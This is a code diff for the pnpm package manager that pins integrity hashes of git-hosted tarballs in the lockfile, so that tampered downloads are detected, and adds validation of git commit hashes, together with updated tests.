@@ -1,3 +1,722 @@
+--- /dev/null
++++ b/.changeset/git-tarball-integrity.md
+@@ -0,0 +1,19 @@
++---
++"@pnpm/git-resolver": patch
++"@pnpm/license-scanner": patch
++"@pnpm/lockfile.fs": patch
++"@pnpm/lockfile.types": patch
++"@pnpm/lockfile.utils": patch
++"@pnpm/package-requester": patch
++"@pnpm/pick-fetcher": patch
++"@pnpm/plugin-commands-rebuild": patch
++"@pnpm/plugin-commands-store": patch
++"@pnpm/resolve-dependencies": patch
++"@pnpm/resolver-base": patch
++"@pnpm/tarball-fetcher": patch
++"pnpm": patch
++---
++
++Pin the integrity of git-hosted tarballs (codeload.github.com, gitlab.com, bitbucket.org) in the lockfile so that subsequent installs detect a tampered or substituted tarball and refuse to install it. Previously the lockfile only stored the tarball URL for git dependencies, so a compromised git host or a man-in-the-middle could serve arbitrary code on later installs without lockfile changes.
++
++A new `gitHosted: true` field is recorded on git-hosted tarball resolutions in the lockfile, letting every reader/writer route them by a single typed check instead of pattern-matching the tarball URL in each call site. Lockfiles written by older pnpm versions are enriched on load (URL fallback) so the field can be relied on uniformly across the codebase.
+--- a/exec/plugin-commands-rebuild/src/implementation/index.ts
++++ b/exec/plugin-commands-rebuild/src/implementation/index.ts
+@@ -351,9 +351,12 @@ async function _rebuild (
+         }
+         const resolution = (pkgSnapshot.resolution as TarballResolution)
+         let sideEffectsCacheKey: string | undefined
+-        const pkgId = `${pkgInfo.name}@${pkgInfo.version}`
+-        if (opts.skipIfHasSideEffectsCache && resolution.integrity) {
+-          const filesIndexFile = getIndexFilePathInCafs(opts.storeDir, resolution.integrity!.toString(), pkgId)
++        // Match the resolver-supplied pkg.id used by package-requester: the
++        // tarball URL for git-hosted packages (nonSemverVersion) and
++        // `name@version` for npm-hosted ones.
++        const pkgId = pkgInfo.nonSemverVersion ?? `${pkgInfo.name}@${pkgInfo.version}`
++        if (opts.skipIfHasSideEffectsCache && (resolution.gitHosted === true || resolution.integrity)) {
++          const filesIndexFile = pickRebuildIndexFilePath(opts.storeDir, resolution, pkgId, opts.virtualStoreDirMaxLength)
+           let pkgFilesIndex: PackageFilesIndex | undefined
+           try {
+             pkgFilesIndex = await loadJsonFile<PackageFilesIndex>(filesIndexFile)
+@@ -388,9 +391,9 @@ async function _rebuild (
+           shellEmulator: opts.shellEmulator,
+           unsafePerm: opts.unsafePerm || false,
+         })
+-        if (hasSideEffects && (opts.sideEffectsCacheWrite ?? true) && resolution.integrity) {
++        if (hasSideEffects && (opts.sideEffectsCacheWrite ?? true) && (resolution.gitHosted === true || resolution.integrity)) {
+           builtDepPaths.add(depPath)
+-          const filesIndexFile = getIndexFilePathInCafs(opts.storeDir, resolution.integrity!.toString(), pkgId)
++          const filesIndexFile = pickRebuildIndexFilePath(opts.storeDir, resolution, pkgId, opts.virtualStoreDirMaxLength)
+           try {
+             if (!sideEffectsCacheKey) {
+               sideEffectsCacheKey = calcDepState(depGraph, depsStateCache, depPath, {
+@@ -471,6 +474,22 @@ async function _rebuild (
+   return { pkgsThatWereRebuilt, ignoredPkgs }
+ }
+ 
++// Git-hosted resolutions are post-processed (preparePackage / packlist) on
++// extraction, so their index file lives in the per-package store path
++// keyed by built/not-built — not in the integrity-based cafs key, even
++// though integrity is now pinned in the lockfile for tamper detection.
++function pickRebuildIndexFilePath (
++  storeDir: string,
++  resolution: TarballResolution,
++  pkgId: string,
++  virtualStoreDirMaxLength: number
++): string {
++  if (resolution.gitHosted === true) {
++    return path.join(storeDir, dp.depPathToFilename(pkgId, virtualStoreDirMaxLength), 'integrity.json')
++  }
++  return getIndexFilePathInCafs(storeDir, resolution.integrity!.toString(), pkgId)
++}
++
+ function binDirsInAllParentDirs (pkgRoot: string, lockfileDir: string): string[] {
+   const binDirs: string[] = []
+   let dir = pkgRoot
+--- a/fetching/pick-fetcher/src/index.ts
++++ b/fetching/pick-fetcher/src/index.ts
+@@ -7,7 +7,12 @@ export function pickFetcher (fetcherByHostingType: Partial<Fetchers>, resolution
+   if (resolution.type == null) {
+     if (resolution.tarball.startsWith('file:')) {
+       fetcherType = 'localTarball'
+-    } else if (isGitHostedPkgUrl(resolution.tarball)) {
++    } else if (
++      ('gitHosted' in resolution && resolution.gitHosted === true) ||
++      // URL fallback for resolutions that didn't go through the resolver or
++      // the lockfile loader (e.g., constructed ad-hoc).
++      isGitHostedPkgUrl(resolution.tarball)
++    ) {
+       fetcherType = 'gitHostedTarball'
+     } else {
+       fetcherType = 'remoteTarball'
+--- a/fetching/tarball-fetcher/src/gitHostedTarballFetcher.ts
++++ b/fetching/tarball-fetcher/src/gitHostedTarballFetcher.ts
+@@ -27,7 +27,7 @@ export interface CreateGitHostedTarballFetcher {
+ export function createGitHostedTarballFetcher (fetchRemoteTarball: FetchFunction, fetcherOpts: CreateGitHostedTarballFetcher): FetchFunction {
+   const fetch = async (cafs: Cafs, resolution: Resolution, opts: FetchOptions) => {
+     const tempIndexFile = pathTemp(opts.filesIndexFile)
+-    const { filesIndex, manifest, requiresBuild } = await fetchRemoteTarball(cafs, resolution, {
++    const { filesIndex, manifest, requiresBuild, integrity } = await fetchRemoteTarball(cafs, resolution, {
+       ...opts,
+       filesIndexFile: tempIndexFile,
+     })
+@@ -40,6 +40,9 @@ export function createGitHostedTarballFetcher (fetchRemoteTarball: FetchFunction
+         filesIndex: prepareResult.filesIndex,
+         manifest: prepareResult.manifest ?? manifest,
+         requiresBuild,
++        // Propagate the raw tarball integrity so the lockfile pins it and
++        // future installs detect a tampered tarball from the git host.
++        integrity,
+       }
+     } catch (err: unknown) {
+       assert(util.types.isNativeError(err))
+--- a/fetching/tarball-fetcher/test/fetch.ts
++++ b/fetching/tarball-fetcher/test/fetch.ts
+@@ -468,6 +468,26 @@ test('take only the files included in the package, when fetching a git-hosted pa
+     'dist/index.js',
+     'package.json',
+   ])
++  // The fetcher must surface the integrity of the downloaded git tarball so
++  // that the lockfile can pin it (CVE: malicious codeload.github.com responses).
++  expect(result.integrity).toMatch(/^sha512-/)
++})
++
++test('verify integrity of git-hosted tarball against the resolution', async () => {
++  process.chdir(tempy.directory())
++
++  const resolution = {
++    tarball: 'https://codeload.github.com/pnpm-e2e/pkg-with-ignored-files/tar.gz/958d6d487217512bb154d02836e9b5b922a600d8',
++    // A well-formed sha512 SRI that doesn't match the actual tarball — should
++    // surface as TarballIntegrityError when the buffer is verified.
++    integrity: 'sha512-MRqvs50psUtGELoeBcJwDUi7lT6RUXBzTHsU3U701V/DIouBQSZo+tx5xSXDJLEcItepyZPjIncx8Xy4qPFlKw==',
++  }
++
++  await expect(fetch.gitHostedTarball(cafs, resolution, {
++    filesIndexFile,
++    lockfileDir: process.cwd(),
++    pkg,
++  })).rejects.toThrow(TarballIntegrityError)
+ })
+ 
+ test('fail when extracting a broken tarball', async () => {
+--- a/lockfile/fs/src/lockfileFormatConverters.ts
++++ b/lockfile/fs/src/lockfileFormatConverters.ts
+@@ -9,6 +9,7 @@ import {
+   type LockfileFileProjectResolvedDependencies,
+   type LockfilePackageInfo,
+   type PackageSnapshots,
++  type TarballResolution,
+ } from '@pnpm/lockfile.types'
+ import { type DepPath, DEPENDENCIES_FIELDS } from '@pnpm/types'
+ import isEmpty from 'ramda/src/isEmpty'
+@@ -18,6 +19,19 @@ import pickBy from 'ramda/src/pickBy'
+ import pick from 'ramda/src/pick'
+ import { LOCKFILE_VERSION } from '@pnpm/constants'
+ 
++// Minimal duplicate of `isGitHostedPkgUrl` from `@pnpm/fetching.pick-fetcher`,
++// inlined to avoid pulling the fetcher dep into the lockfile I/O layer. Used
++// to enrich entries written by older pnpm versions (which didn't record the
++// `gitHosted` field on TarballResolution) so every downstream reader can rely
++// on the field directly.
++function isGitHostedTarballUrl (url: string): boolean {
++  return (
++    url.startsWith('https://codeload.github.com/') ||
++    url.startsWith('https://bitbucket.org/') ||
++    url.startsWith('https://gitlab.com/')
++  ) && url.includes('tar.gz')
++}
++
+ export function convertToLockfileFile (lockfile: LockfileObject): LockfileFile {
+   const packages: Record<string, LockfilePackageInfo> = {}
+   const snapshots: Record<string, LockfilePackageSnapshot> = {}
+@@ -151,6 +165,7 @@ export function convertToLockfileObject (lockfile: LockfileFile): LockfileObject
+   for (const [depPath, pkg] of Object.entries(lockfile.snapshots ?? {})) {
+     const pkgId = removeSuffix(depPath)
+     packages[depPath as DepPath] = Object.assign(pkg, lockfile.packages?.[pkgId])
++    enrichGitHostedFlag(packages[depPath as DepPath]?.resolution as TarballResolution | undefined)
+   }
+   return {
+     ...omit(['snapshots'], rest),
+@@ -159,6 +174,18 @@ export function convertToLockfileObject (lockfile: LockfileFile): LockfileObject
+   }
+ }
+ 
++// Backfill the `gitHosted` flag for tarball resolutions written by older
++// pnpm versions. Doing it once at load time lets every downstream reader
++// rely on the typed field instead of repeating URL prefix matches.
++function enrichGitHostedFlag (resolution: TarballResolution | undefined): void {
++  if (resolution == null) return
++  if (resolution.type !== undefined) return
++  if (resolution.gitHosted != null) return
++  if (resolution.tarball != null && isGitHostedTarballUrl(resolution.tarball)) {
++    resolution.gitHosted = true
++  }
++}
++
+ function convertProjectSnapshotToInlineSpecifiersFormat (
+   projectSnapshot: ProjectSnapshot
+ ): LockfileFileProjectSnapshot {
+--- a/lockfile/types/src/index.ts
++++ b/lockfile/types/src/index.ts
+@@ -90,6 +90,19 @@ export interface TarballResolution {
+   tarball: string
+   integrity?: string
+   path?: string
++  /**
++   * True for tarballs sourced from a git host (codeload.github.com /
++   * gitlab.com / bitbucket.org). Such tarballs need preparation
++   * (preparePackage / packlist) on extraction, and their cached content
++   * depends on whether build scripts ran, so they're addressed by
++   * gitHostedStoreIndexKey rather than the integrity-based key.
++   *
++   * The git resolver sets this when it produces the resolution; the
++   * lockfile loader sets it on entries whose URL matches a known git host
++   * for backward compatibility with lockfiles written before this field
++   * existed.
++   */
++  gitHosted?: boolean
+ }
+ 
+ /**
+--- a/lockfile/utils/package.json
++++ b/lockfile/utils/package.json
+@@ -35,7 +35,6 @@
+   "dependencies": {
+     "@pnpm/dependency-path": "workspace:*",
+     "@pnpm/lockfile.types": "workspace:*",
+-    "@pnpm/pick-fetcher": "workspace:*",
+     "@pnpm/resolver-base": "workspace:*",
+     "@pnpm/types": "workspace:*",
+     "get-npm-tarball-url": "catalog:",
+--- a/lockfile/utils/src/pkgSnapshotToResolution.ts
++++ b/lockfile/utils/src/pkgSnapshotToResolution.ts
+@@ -3,7 +3,6 @@ import { type PackageSnapshot, type TarballResolution } from '@pnpm/lockfile.typ
+ import { type Resolution } from '@pnpm/resolver-base'
+ import { type Registries } from '@pnpm/types'
+ import getNpmTarballUrl from 'get-npm-tarball-url'
+-import { isGitHostedPkgUrl } from '@pnpm/pick-fetcher'
+ import { nameVerFromPkgSnapshot } from './nameVerFromPkgSnapshot.js'
+ 
+ export function pkgSnapshotToResolution (
+@@ -14,7 +13,7 @@ export function pkgSnapshotToResolution (
+   if (
+     Boolean((pkgSnapshot.resolution as TarballResolution).type) ||
+     (pkgSnapshot.resolution as TarballResolution).tarball?.startsWith('file:') ||
+-    isGitHostedPkgUrl((pkgSnapshot.resolution as TarballResolution).tarball ?? '')
++    (pkgSnapshot.resolution as TarballResolution).gitHosted === true
+   ) {
+     return pkgSnapshot.resolution as Resolution
+   }
+--- a/lockfile/utils/tsconfig.json
++++ b/lockfile/utils/tsconfig.json
+@@ -9,9 +9,6 @@
+     "../../__typings__/**/*.d.ts"
+   ],
+   "references": [
+-    {
+-      "path": "../../fetching/pick-fetcher"
+-    },
+     {
+       "path": "../../packages/dependency-path"
+     },
+--- a/pkg-manager/core/test/install/fromRepo.ts
++++ b/pkg-manager/core/test/install/fromRepo.ts
+@@ -255,7 +255,11 @@ test('re-adding a git repo with a different tag', async () => {
+   expect(lockfile.packages).toEqual(
+     {
+       'is-negative@https://codeload.github.com/kevva/is-negative/tar.gz/163360a8d3ae6bee9524541043197ff356f8ed99': {
+-        resolution: { tarball: 'https://codeload.github.com/kevva/is-negative/tar.gz/163360a8d3ae6bee9524541043197ff356f8ed99' },
++        resolution: {
++          tarball: 'https://codeload.github.com/kevva/is-negative/tar.gz/163360a8d3ae6bee9524541043197ff356f8ed99',
++          integrity: expect.stringMatching(/^sha512-/),
++          gitHosted: true,
++        },
+         version: '1.0.0',
+         engines: { node: '>=0.10.0' },
+       },
+@@ -272,7 +276,11 @@ test('re-adding a git repo with a different tag', async () => {
+   expect(lockfile.packages).toEqual(
+     {
+       'is-negative@https://codeload.github.com/kevva/is-negative/tar.gz/f7dec4d66a5a56719e49b9f94a24d73f924ddeb3': {
+-        resolution: { tarball: 'https://codeload.github.com/kevva/is-negative/tar.gz/f7dec4d66a5a56719e49b9f94a24d73f924ddeb3' },
++        resolution: {
++          tarball: 'https://codeload.github.com/kevva/is-negative/tar.gz/f7dec4d66a5a56719e49b9f94a24d73f924ddeb3',
++          integrity: expect.stringMatching(/^sha512-/),
++          gitHosted: true,
++        },
+         version: '1.0.1',
+         engines: { node: '>=0.10.0' },
+       },
+--- a/pkg-manager/package-requester/src/packageRequester.ts
++++ b/pkg-manager/package-requester/src/packageRequester.ts
+@@ -401,25 +401,27 @@ function getFilesIndexFilePath (
+ ): GetFilesIndexFilePathResult {
+   const targetRelative = depPathToFilename(opts.pkg.id, ctx.virtualStoreDirMaxLength)
+   const target = path.join(ctx.storeDir, targetRelative)
+-  if ((opts.pkg.resolution as TarballResolution).integrity) {
+-    return {
+-      target,
+-      filesIndexFile: ctx.getIndexFilePathInCafs((opts.pkg.resolution as TarballResolution).integrity!, opts.pkg.id),
+-      resolution: opts.pkg.resolution as AtomicResolution,
+-    }
+-  }
+-  let resolution!: AtomicResolution
++  let resolution: AtomicResolution
+   if (opts.pkg.resolution.type === 'variations') {
+     resolution = findResolution(opts.pkg.resolution.variants, opts.supportedArchitectures)
+-    if ((resolution as TarballResolution).integrity) {
+-      return {
+-        target,
+-        filesIndexFile: ctx.getIndexFilePathInCafs((resolution as TarballResolution).integrity!, opts.pkg.id),
+-        resolution,
+-      }
+-    }
+   } else {
+-    resolution = opts.pkg.resolution
++    resolution = opts.pkg.resolution as AtomicResolution
++  }
++  // Git-hosted tarballs are post-processed (preparePackage / packlist) on
++  // extraction, and their cached content depends on whether build scripts
++  // ran, so they must stay on the per-package store path keyed by built/
++  // not-built — never on the integrity-based cafs key, even though
++  // integrity is now pinned in the lockfile for tamper detection.
++  if ((resolution as TarballResolution).gitHosted === true) {
++    const filesIndexFile = path.join(target, opts.ignoreScripts ? 'integrity-not-built.json' : 'integrity.json')
++    return { filesIndexFile, target, resolution }
++  }
++  if ((resolution as TarballResolution).integrity) {
++    return {
++      target,
++      filesIndexFile: ctx.getIndexFilePathInCafs((resolution as TarballResolution).integrity!, opts.pkg.id),
++      resolution,
++    }
+   }
+   const filesIndexFile = path.join(target, opts.ignoreScripts ? 'integrity-not-built.json' : 'integrity.json')
+   return { filesIndexFile, target, resolution }
+--- a/pkg-manager/resolve-dependencies/src/updateLockfile.ts
++++ b/pkg-manager/resolve-dependencies/src/updateLockfile.ts
+@@ -5,7 +5,7 @@ import {
+   type PackageSnapshot,
+   pruneSharedLockfile,
+ } from '@pnpm/lockfile.pruner'
+-import { type Resolution } from '@pnpm/resolver-base'
++import { type Resolution, type TarballResolution } from '@pnpm/resolver-base'
+ import { type DepPath, type Registries } from '@pnpm/types'
+ import * as dp from '@pnpm/dependency-path'
+ import getNpmTarballUrl from 'get-npm-tarball-url'
+@@ -189,11 +189,27 @@ function toLockfileResolution (
+   if (resolution.type !== undefined || !resolution['integrity']) {
+     return resolution as LockfileResolution
+   }
++  const tarball = resolution['tarball'] as string | undefined
++  // Honor the resolver-supplied flag, with a URL fallback for resolutions
++  // that didn't go through the git resolver (e.g. legacy lockfiles read by
++  // callers that don't enrich the field).
++  const gitHosted = (resolution as TarballResolution).gitHosted === true ||
++    (tarball != null && isGitHostedTarballUrl(tarball))
+   if (lockfileIncludeTarballUrl) {
+-    return {
++    return preservingGitHosted({
+       integrity: resolution['integrity'],
+-      tarball: resolution['tarball'],
+-    }
++      tarball,
++    }, gitHosted)
++  }
++  // Tarball URLs that cannot be reconstructed from the package name, version,
++  // and registry must always stay in the lockfile, otherwise the package can
++  // no longer be re-fetched. This covers tarballs served by git providers
++  // (GitHub, GitLab, Bitbucket).
++  if (tarball != null && gitHosted) {
++    return preservingGitHosted({
++      integrity: resolution['integrity'],
++      tarball,
++    }, gitHosted)
+   }
+   // Sometimes packages are hosted under non-standard tarball URLs.
+   // For instance, when they are hosted on npm Enterprise. See https://github.com/pnpm/pnpm/issues/867
+@@ -211,6 +227,24 @@ function toLockfileResolution (
+   }
+ }
+ 
++function preservingGitHosted<T extends { tarball?: string, integrity: string }> (
++  resolution: T,
++  gitHosted: boolean
++): T & { gitHosted?: boolean } {
++  return gitHosted ? { ...resolution, gitHosted: true } : resolution
++}
++
++// Inlined to avoid pulling @pnpm/pick-fetcher into this dep graph.
++// Used as a fallback when callers haven't pre-set the `gitHosted` field
++// on TarballResolution.
++function isGitHostedTarballUrl (url: string): boolean {
++  return (
++    url.startsWith('https://codeload.github.com/') ||
++    url.startsWith('https://bitbucket.org/') ||
++    url.startsWith('https://gitlab.com/')
++  ) && url.includes('tar.gz')
++}
++
+ function removeProtocol (url: string): string {
+   return url.split('://')[1]
+ }
+--- a/resolving/git-resolver/src/index.ts
++++ b/resolving/git-resolver/src/index.ts
+@@ -42,7 +42,7 @@ export function createGitResolver (
+       const tarball = hosted.tarball?.()
+ 
+       if (tarball) {
+-        resolution = { tarball }
++        resolution = { tarball, gitHosted: true }
+       }
+     }
+ 
+--- a/resolving/git-resolver/test/index.ts
++++ b/resolving/git-resolver/test/index.ts
+@@ -22,6 +22,7 @@ test('resolveFromGit() with commit', async () => {
+     normalizedBareSpecifier: 'github:zkochan/is-negative#163360a8d3ae6bee9524541043197ff356f8ed99',
+     resolution: {
+       tarball: 'https://codeload.github.com/zkochan/is-negative/tar.gz/163360a8d3ae6bee9524541043197ff356f8ed99',
++      gitHosted: true,
+     },
+     resolvedVia: 'git-repository',
+   })
+@@ -39,6 +40,7 @@ test('resolveFromGit() with no commit', async () => {
+       normalizedBareSpecifier: 'github:zkochan/is-negative',
+       resolution: {
+         tarball: 'https://codeload.github.com/zkochan/is-negative/tar.gz/1d7e288222b53a0cab90a331f1865220ec29560c',
++        gitHosted: true,
+       },
+       resolvedVia: 'git-repository',
+     })
+@@ -52,6 +54,7 @@ test('resolveFromGit() with no commit, when main branch is not master', async ()
+     normalizedBareSpecifier: 'github:zoli-forks/cmd-shim',
+     resolution: {
+       tarball: 'https://codeload.github.com/zoli-forks/cmd-shim/tar.gz/a00a83a1593edb6e395d3ce41f2ef70edf7e2cf5',
++      gitHosted: true,
+     },
+     resolvedVia: 'git-repository',
+   })
+@@ -64,6 +67,7 @@ test('resolveFromGit() with partial commit', async () => {
+     normalizedBareSpecifier: 'github:zoli-forks/cmd-shim#a00a83a',
+     resolution: {
+       tarball: 'https://codeload.github.com/zoli-forks/cmd-shim/tar.gz/a00a83a1593edb6e395d3ce41f2ef70edf7e2cf5',
++      gitHosted: true,
+     },
+     resolvedVia: 'git-repository',
+   })
+@@ -82,6 +86,7 @@ test('resolveFromGit() with branch', async () => {
+     normalizedBareSpecifier: 'github:zkochan/is-negative#canary',
+     resolution: {
+       tarball: 'https://codeload.github.com/zkochan/is-negative/tar.gz/4c39fbc124cd4944ee51cb082ad49320fab58121',
++      gitHosted: true,
+     },
+     resolvedVia: 'git-repository',
+   })
+@@ -94,6 +99,7 @@ test('resolveFromGit() with branch relative to refs', async () => {
+     normalizedBareSpecifier: 'github:zkochan/is-negative#heads/canary',
+     resolution: {
+       tarball: 'https://codeload.github.com/zkochan/is-negative/tar.gz/4c39fbc124cd4944ee51cb082ad49320fab58121',
++      gitHosted: true,
+     },
+     resolvedVia: 'git-repository',
+   })
+@@ -106,6 +112,7 @@ test('resolveFromGit() with tag', async () => {
+     normalizedBareSpecifier: 'github:zkochan/is-negative#2.0.1',
+     resolution: {
+       tarball: 'https://codeload.github.com/zkochan/is-negative/tar.gz/6dcce91c268805d456b8a575b67d7febc7ae2933',
++      gitHosted: true,
+     },
+     resolvedVia: 'git-repository',
+   })
+@@ -118,6 +125,7 @@ test.skip('resolveFromGit() with tag (v-prefixed tag)', async () => {
+     normalizedBareSpecifier: 'github:andreineculau/npm-publish-git#v0.0.7',
+     resolution: {
+       tarball: 'https://codeload.github.com/andreineculau/npm-publish-git/tar.gz/a2f8d94562884e9529cb12c0818312ac87ab7f0b',
++      gitHosted: true,
+     },
+     resolvedVia: 'git-repository',
+   })
+@@ -130,6 +138,7 @@ test('resolveFromGit() with strict semver', async () => {
+     normalizedBareSpecifier: 'github:zkochan/is-negative#semver:1.0.0',
+     resolution: {
+       tarball: 'https://codeload.github.com/zkochan/is-negative/tar.gz/163360a8d3ae6bee9524541043197ff356f8ed99',
++      gitHosted: true,
+     },
+     resolvedVia: 'git-repository',
+   })
+@@ -142,6 +151,7 @@ test.skip('resolveFromGit() with strict semver (v-prefixed tag)', async () => {
+     normalizedBareSpecifier: 'github:andreineculau/npm-publish-git#semver:v0.0.7',
+     resolution: {
+       tarball: 'https://codeload.github.com/andreineculau/npm-publish-git/tar.gz/a2f8d94562884e9529cb12c0818312ac87ab7f0b',
++      gitHosted: true,
+     },
+     resolvedVia: 'git-repository',
+   })
+@@ -154,6 +164,7 @@ test('resolveFromGit() with range semver', async () => {
+     normalizedBareSpecifier: 'github:zkochan/is-negative#semver:^1.0.0',
+     resolution: {
+       tarball: 'https://codeload.github.com/zkochan/is-negative/tar.gz/f7dec4d66a5a56719e49b9f94a24d73f924ddeb3',
++      gitHosted: true,
+     },
+     resolvedVia: 'git-repository',
+   })
+@@ -166,6 +177,7 @@ test.skip('resolveFromGit() with range semver (v-prefixed tag)', async () => {
+     normalizedBareSpecifier: 'github:andreineculau/npm-publish-git#semver:<=v0.0.7',
+     resolution: {
+       tarball: 'https://codeload.github.com/andreineculau/npm-publish-git/tar.gz/a2f8d94562884e9529cb12c0818312ac87ab7f0b',
++      gitHosted: true,
+     },
+     resolvedVia: 'git-repository',
+   })
+@@ -179,6 +191,7 @@ test('resolveFromGit() with sub folder', async () => {
+     resolution: {
+       tarball: 'https://codeload.github.com/RexSkz/test-git-subfolder-fetch/tar.gz/2b42a57a945f19f8ffab8ecbd2021fdc2c58ee22',
+       path: '/packages/simple-react-app',
++      gitHosted: true,
+     },
+     resolvedVia: 'git-repository',
+   })
+@@ -192,6 +205,7 @@ test('resolveFromGit() with both sub folder and branch', async () => {
+     resolution: {
+       tarball: 'https://codeload.github.com/RexSkz/test-git-subfolder-fetch/tar.gz/777e8a3e78cc89bbf41fb3fd9f6cf922d5463313',
+       path: '/packages/simple-react-app',
++      gitHosted: true,
+     },
+     resolvedVia: 'git-repository',
+   })
+@@ -258,6 +272,7 @@ test.skip('resolveFromGit() bitbucket with commit', async () => {
+     normalizedBareSpecifier: 'bitbucket:pnpmjs/git-resolver#988c61e11dc8d9ca0b5580cb15291951812549dc',
+     resolution: {
+       tarball: 'https://bitbucket.org/pnpmjs/git-resolver/get/988c61e11dc8d9ca0b5580cb15291951812549dc.tar.gz',
++      gitHosted: true,
+     },
+     resolvedVia: 'git-repository',
+   })
+@@ -301,6 +316,7 @@ test.skip('resolveFromGit() bitbucket with tag', async () => {
+     normalizedBareSpecifier: 'bitbucket:pnpmjs/git-resolver#0.3.4',
+     resolution: {
+       tarball: 'https://bitbucket.org/pnpmjs/git-resolver/get/87cf6a67064d2ce56e8cd20624769a5512b83ff9.tar.gz',
++      gitHosted: true,
+     },
+     resolvedVia: 'git-repository',
+   })
+@@ -328,6 +344,7 @@ test.skip('resolveFromGit() gitlab with commit', async () => {
+     normalizedBareSpecifier: 'gitlab:pnpm/git-resolver#988c61e11dc8d9ca0b5580cb15291951812549dc',
+     resolution: {
+       tarball: 'https://gitlab.com/api/v4/projects/pnpm%2Fgit-resolver/repository/archive.tar.gz?ref=988c61e11dc8d9ca0b5580cb15291951812549dc',
++      gitHosted: true,
+     },
+     resolvedVia: 'git-repository',
+   })
+@@ -371,6 +388,7 @@ test.skip('resolveFromGit() gitlab with tag', async () => {
+     normalizedBareSpecifier: 'gitlab:pnpm/git-resolver#0.3.4',
+     resolution: {
+       tarball: 'https://gitlab.com/api/v4/projects/pnpm%2Fgit-resolver/repository/archive.tar.gz?ref=87cf6a67064d2ce56e8cd20624769a5512b83ff9',
++      gitHosted: true,
+     },
+     resolvedVia: 'git-repository',
+   })
+@@ -383,6 +401,7 @@ test('resolveFromGit() normalizes full url', async () => {
+     normalizedBareSpecifier: 'github:zkochan/is-negative#2.0.1',
+     resolution: {
+       tarball: 'https://codeload.github.com/zkochan/is-negative/tar.gz/6dcce91c268805d456b8a575b67d7febc7ae2933',
++      gitHosted: true,
+     },
+     resolvedVia: 'git-repository',
+   })
+@@ -395,6 +414,7 @@ test('resolveFromGit() normalizes full url with port', async () => {
+     normalizedBareSpecifier: 'github:zkochan/is-negative#2.0.1',
+     resolution: {
+       tarball: 'https://codeload.github.com/zkochan/is-negative/tar.gz/6dcce91c268805d456b8a575b67d7febc7ae2933',
++      gitHosted: true,
+     },
+     resolvedVia: 'git-repository',
+   })
+@@ -407,6 +427,7 @@ test('resolveFromGit() normalizes full url (alternative form)', async () => {
+     normalizedBareSpecifier: 'github:zkochan/is-negative#2.0.1',
+     resolution: {
+       tarball: 'https://codeload.github.com/zkochan/is-negative/tar.gz/6dcce91c268805d456b8a575b67d7febc7ae2933',
++      gitHosted: true,
+     },
+     resolvedVia: 'git-repository',
+   })
+@@ -419,6 +440,7 @@ test('resolveFromGit() normalizes full url (alternative form 2)', async () => {
+     normalizedBareSpecifier: 'github:zkochan/is-negative#2.0.1',
+     resolution: {
+       tarball: 'https://codeload.github.com/zkochan/is-negative/tar.gz/6dcce91c268805d456b8a575b67d7febc7ae2933',
++      gitHosted: true,
+     },
+     resolvedVia: 'git-repository',
+   })
+--- a/resolving/resolver-base/src/index.ts
++++ b/resolving/resolver-base/src/index.ts
+@@ -17,6 +17,14 @@ export interface TarballResolution {
+   tarball: string
+   integrity?: string
+   path?: string
++  /**
++   * True for tarballs sourced from a git host (codeload.github.com /
++   * gitlab.com / bitbucket.org). Such tarballs need preparation
++   * (preparePackage / packlist) on extraction, and their cached content
++   * depends on whether build scripts ran, so they're addressed by
++   * gitHostedStoreIndexKey rather than the integrity-based key.
++   */
++  gitHosted?: boolean
+ }
+ 
+ export interface BinaryResolution {
+--- a/reviewing/license-scanner/src/getPkgInfo.ts
++++ b/reviewing/license-scanner/src/getPkgInfo.ts
+@@ -15,7 +15,7 @@ import {
+ import loadJsonFile from 'load-json-file'
+ import { PnpmError } from '@pnpm/error'
+ import { type LicensePackage } from './licenses.js'
+-import { type DirectoryResolution, type PackageSnapshot, pkgSnapshotToResolution, type Resolution } from '@pnpm/lockfile.utils'
++import { type DirectoryResolution, type PackageSnapshot, pkgSnapshotToResolution, type Resolution, type TarballResolution } from '@pnpm/lockfile.utils'
+ import { fetchFromDir } from '@pnpm/directory-fetcher'
+ 
+ const limitPkgReads = pLimit(4)
+@@ -250,7 +250,11 @@ export async function readPackageIndexFile (
+     }
+   }
+ 
+-  const isPackageWithIntegrity = 'integrity' in packageResolution
++  // Git-hosted resolutions are post-processed (preparePackage / packlist)
++  // on extraction, so their index file lives in the per-package store path
++  // even though integrity is now pinned in the lockfile.
++  const isGitHosted = !packageResolution.type && (packageResolution as TarballResolution).gitHosted === true
++  const isPackageWithIntegrity = !isGitHosted && 'integrity' in packageResolution
+ 
+   let pkgIndexFilePath
+   if (isPackageWithIntegrity) {
+--- a/store/plugin-commands-store/src/storeStatus/index.ts
++++ b/store/plugin-commands-store/src/storeStatus/index.ts
+@@ -39,17 +39,19 @@ export async function storeStatus (maybeOpts: StoreStatusOptions): Promise<strin
+     .filter(([depPath]) => !skipped.has(depPath))
+     .map(([depPath, pkgSnapshot]) => {
+       const id = packageIdFromSnapshot(depPath, pkgSnapshot)
++      const resolution = pkgSnapshot.resolution as TarballResolution
+       return {
+         depPath,
+         id,
+-        integrity: (pkgSnapshot.resolution as TarballResolution).integrity,
++        integrity: resolution.integrity,
++        gitHosted: resolution.gitHosted === true,
+         pkgPath: depPath,
+         ...nameVerFromPkgSnapshot(depPath, pkgSnapshot),
+       }
+     })
+ 
+-  const modified = await pFilter(pkgs, async ({ id, integrity, depPath, name }) => {
+-    const pkgIndexFilePath = integrity
++  const modified = await pFilter(pkgs, async ({ id, integrity, gitHosted, depPath, name }) => {
++    const pkgIndexFilePath = !gitHosted && integrity
+       ? getIndexFilePathInCafs(storeDir, integrity, id)
+       : path.join(storeDir, dp.depPathToFilename(id, maybeOpts.virtualStoreDirMaxLength), 'integrity.json')
+     const { files } = await loadJsonFile<PackageFilesIndex>(pkgIndexFilePath)
+
+--- a/fetching/git-fetcher/src/index.ts
++++ b/fetching/git-fetcher/src/index.ts
+@@ -23,6 +23,9 @@ export function createGitFetcher (createOpts: CreateGitFetcherOptions): { git: G
+   const ignoreScripts = createOpts.ignoreScripts ?? false
+ 
+   const gitFetcher: GitFetcher = async (cafs, resolution, opts) => {
++    if (!isValidCommitHash(resolution.commit)) {
++      throw new PnpmError('INVALID_GIT_COMMIT', `Invalid git commit hash "${resolution.commit}" for repository "${resolution.repo}". Expected a 40-character hexadecimal SHA.`)
++    }
+     const tempLocation = await cafs.tempDir()
+     if (allowedHosts.size > 0 && shouldUseShallow(resolution.repo, allowedHosts)) {
+       await execGit(['init'], { cwd: tempLocation })
+@@ -74,6 +77,10 @@ export function createGitFetcher (createOpts: CreateGitFetcherOptions): { git: G
+   }
+ }
+ 
